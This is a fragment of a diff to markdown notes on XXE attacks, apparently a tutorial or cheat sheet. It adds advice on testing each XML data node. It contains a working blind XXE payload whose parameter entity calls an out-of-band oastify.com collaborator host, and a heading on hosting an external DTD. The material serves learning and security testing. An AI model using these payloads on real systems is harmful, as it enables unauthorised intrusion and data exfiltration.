@@ -10,6 +10,7 @@
 
 <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://x0yhzy601i8gxlhsy2md1wesxj3ar2fr.oastify.com"> %xxe; ]>  >> For Blind xxe via XML parameter entities.
 ```
+With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.
 ### Exploiting blind XXE via external DTD server
 Host this payload with burp collaborator in external DTD server.
 ```xml
